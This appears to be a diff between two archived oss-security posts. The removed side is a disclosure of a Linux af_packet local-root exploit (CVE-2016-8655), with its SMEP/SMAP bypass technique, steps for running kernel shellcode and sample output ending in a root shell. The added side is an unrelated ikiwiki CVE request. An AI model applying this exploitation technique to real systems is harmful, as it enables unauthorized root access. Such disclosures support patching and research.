@@ -1,85 +1,28 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/07/3
-Message-ID: <CAHQ_-nTRLMQ21e3DHESbRcJcK3H3DCZGB9yrkx-TeMRi4f5vVQ@mail.gmail.com>
-Date: Wed, 7 Dec 2016 15:03:29 +0900
-From: Philip Pettersson <philip.pettersson@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/20/7
+Message-ID: <20161220214910.zdn7bixh2i5jjwjb@perpetual.pseudorandom.co.uk>
+Date: Tue, 20 Dec 2016 21:49:10 +0000
+From: Simon McVittie <smcv@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2016-8655 Linux af_packet.c race condition (local root)
+Subject: CVE request: ikiwiki: authorization bypass when reverting changes
 Content-Type: text/plain; charset=utf-8
 
-Attached is a sample exploit for Ubuntu 16.04 x86_64 and some 14.04
-kernels, but the same method should work for any distro with unprivileged
-user namespace support. I only tested it on 4.4 so there's a high risk
-of kernel panic if you run it on anything but 4.4.
+Reference: http://ikiwiki.info/bugs/rcs_revert_can_bypass_authorization_if_affected_files_were_renamed/
+Vulnerable versions: < 3.20161219
+Fixed versions: >= 3.20161219
+Fix: http://source.ikiwiki.branchable.com/?p=source.git;a=commitdiff;h=9cada49ed6ad24556dbe9861ad5b0a9f526167f9
 
-It defeats SMEP/SMAP by calling set_memory_rw() on the vsyscall page,
-setting up a fake struct ctl_table in that area and finally calling
-register_sysctl_table() to register a world-writable sysctl entry for
-modprobe. Since the instruction pointer is hijacked in interrupt
-context you have to do this even on non-SMEP/SMAP systems, so the
-bypass is more of a by-product.
+ikiwiki is a static site generator with some dynamic features,
+used for wikis, blogs and other websites.
 
-If you want to execute arbitrary kernel shellcode you can also do:
-1. set_memory_rw() on vsyscall page
-2. (userland) write shellcode to vsyscall page
-3. set_memory_x() on vsyscall page
-4. jump to vsyscall page
+intrigeri discovered that on sites with the git and recentchanges
+plugins and the CGI interface enabled, the revert links on the
+RecentChanges page could revert changes on a page the logged-in user
+cannot legitimately edit, if the change being reverted was made before
+the page was renamed from a location that the logged-in user *could*
+legitimately edit.
 
-(However, that requires winning the race three times instead of two.)
+Please allocate a CVE ID for this vulnerability.
 
-You can also run it with "crash" as the first argument to force a panic.
-
-=*=*=*=*=*=*=*=*= SAMPLE OUTPUT =*=*=*=*=*=*=*=*=
-
-user@...ntu:~$ uname -a
-Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC
-2016 x86_64 x86_64 x86_64 GNU/Linux
-user@...ntu:~$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-user@...ntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
-user@...ntu:~$ ./chocobo_root
-linux AF_PACKET race condition exploit by rebel
-kernel version: 4.4.0-51-generic #72
-proc_dostring = 0xffffffff81088090
-modprobe_path = 0xffffffff81e48f80
-register_sysctl_table = 0xffffffff812879a0
-set_memory_rw = 0xffffffff8106f320
-exploit starting
-making vsyscall page writable..
-
-new exploit attempt starting, jumping to 0xffffffff8106f320,
-arg=0xffffffffff600000
-sockets allocated
-removing barrier and spraying..
-version switcher stopping, x = -1 (y = 174222, last val = 2)
-current packet version = 0
-pbd->hdr.bh1.offset_to_first_pkt = 48
-*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
-please wait up to a few minutes for timer to be executed. if you
-ctrl-c now the kernel will hang. so don't do that.
-closing socket and verifying.......
-vsyscall page altered!
-
-
-stage 1 completed
-registering new sysctl..
-
-new exploit attempt starting, jumping to 0xffffffff812879a0,
-arg=0xffffffffff600850
-sockets allocated
-removing barrier and spraying..
-version switcher stopping, x = -1 (y = 133577, last val = 2)
-current packet version = 0
-pbd->hdr.bh1.offset_to_first_pkt = 48
-*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
-please wait up to a few minutes for timer to be executed. if you
-ctrl-c now the kernel will hang. so don't do that.
-closing socket and verifying.......
-sysctl added!
-
-stage 2 completed
-binary executed by kernel, launching rootshell
-root@...ntu:~# id
-uid=0(root) gid=0(root) groups=0(root),1000(user)
-
-View attachment "chocobo_root.c" of type "text/x-csrc" (20105 bytes)
+Thanks,
+    S
